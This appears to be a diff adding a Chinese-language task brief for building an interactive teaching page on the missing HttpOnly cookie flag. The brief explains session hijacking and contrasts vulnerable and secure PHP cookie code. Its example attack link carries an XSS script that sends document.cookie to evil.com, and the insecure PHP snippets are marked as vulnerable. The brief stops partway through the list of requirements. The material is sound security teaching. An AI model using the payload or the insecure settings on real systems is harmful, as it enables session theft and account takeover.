@@ -1,0 +1,83 @@
+背景資訊
+1. 要實作的是 Cookie No HttpOnly Flag
+2. 參考資料如下
+
+Cookie No HttpOnly Flag
+1. 簡介 (Introduction)
+(1) HttpOnly 是一個附加在 HTTP 響應頭 Set-Cookie 中的屬性標籤。當
+Cookie 被設置為 HttpOnly 時，瀏覽器會限制客戶端腳本（如
+JavaScript）透過 document.cookie API 存取該 Cookie。
+(2) 其核心問題在於身份憑證的暴露。預設情況下，瀏覽器允許腳本存取
+Cookie。如果 Web 應用程式存在 XSS 漏洞，攻擊者可以注入惡意腳本
+來讀取包含 Session ID 的 Cookie。
+(3) 若欠缺 HttpOnly 標籤，攻擊者一旦成功執行 XSS，即可輕易竊取用戶
+的會話令牌（Session Token），並在自己的瀏覽器中冒充該用戶登入系
+統，這被稱為會話劫持 (Session Hijacking)。
+2. 範例 (Example Scenario)
+(1) 漏洞前提： 假設某 PHP 網站未開啟 HttpOnly，且存在一個簡單的反
+射型 XSS 漏洞。
+(2) 攻擊路徑： 攻擊者引導受害者訪問以下連結：
+https://vulnerable-site.com/search.php?name=<script>new
+Image().src="https://evil.com/steal?c="+document.cookie;</script>
+(3) 觸觸發攻擊
+➢ 受害者的瀏覽器執行了惡意腳本。
+➢ 由於 Cookie 沒有 HttpOnly 保護，document.cookie 成功讀取了
+PHPSESSID=abc123...。.
+➢ 腳本將此敏感資料傳送至攻擊者的伺服器
+(4) 劫持後果： 攻擊者取得 Session ID 後，直接手動設置自己瀏覽器的
+Cookie，即可在無需帳號密碼的情況下進入受害者的後台介面。
+3. 危險寫法 (Vulnerable Code - PHP)
+以下是 PHP 常見的危險配置方式，預設或手動設置時忽略了安全性標籤：
+(1) // 方法 A：直接使用預設 session_start()，且 php.ini 未配置安全
+選項
+session_start();
+(2) // 方法 B：手動設置 Cookie 時忽略了 HttpOnly 參數
+setcookie("user_auth", "token_value", time()+3600, "/");
+// 參數清單中最後兩個 boolean 通常代表 Secure 與 HttpOnly，此
+處皆為預設的 false
+4. 安全寫法 (Secure Code - PHP)
+正確的做法是在生成 Cookie 時，明確要求瀏覽器禁止腳本存取。
+(1) 步驟 A：全局配置 (推薦)
+在 php.ini 或程式入口點（如 config.php）進行全局設定，確保所有
+Session Cookie 自動具備防護：
+// 在 session_start() 之前設置
+session_start([
+'cookie_httponly' => true,
+'cookie_secure' => true, // 僅透過 HTTPS 傳輸
+'samesite' => 'Lax' // 防範 CSRF
+]);
+(2) 步驟 B：手動設置特定 Cookie
+使用 setcookie 函數時，將第七個參數設置為 true：
+$name = "user_preference";
+$value = "dark_mode";
+$expire = time() + 3600;
+$path = "/";
+$domain = "";
+$secure = true; // 僅 HTTPS
+$httponly = true; // 關鍵：禁止 JavaScript 存取
+setcookie($name, $value, $expire, $path, $domain, $secure,
+$httponly);
+5. 開發建議 (Development Recommendations)
+從資管與系統合規性的角度出發，建議採取以下防禦策略：
+(1) 深度防禦 (Defense in Depth)： HttpOnly 並不能防止 XSS 攻擊本
+身，但它能極大地降低 XSS 發生後的損害（防止 Session 被盜）。應
+與 CSP 策略、輸入過濾並行。
+(2) 強制 Secure 屬性： 除了 HttpOnly，對於身份憑證應同時開啟
+Secure 標籤，確保 Cookie 不會在不安全的 HTTP 環境下以明文傳
+輸。
+(3) 定期審計配置： 使用瀏覽器開發者工具的 "Application" 面板或
+OWASP ZAP 掃描，檢查所有敏感 Cookie 的 HttpOnly 欄位是否已被勾
+選。
+(4) Session 過期機制： 縮短 Session 的有效時間（TTL），並在用戶登入
+/登出時重新生成 Session ID (session_regenerate_id())，降低憑證
+被利用的窗口期。
+(5) 使用現代 Session 管理： 盡可能依賴 PHP 內建的 Session 機制並正
+確配置，避免自行實作不具備安全標籤的 Cookie 認證系統。
+
+須完成的工作
+增加一個Cookie No HttpOnly Flag的互動網頁,當然,index.html也要做對應的修改
+以下是我期望的結果
+1. 網站外觀要一樣有科技感
+2. 不論是危險寫法或安全寫法
+
+
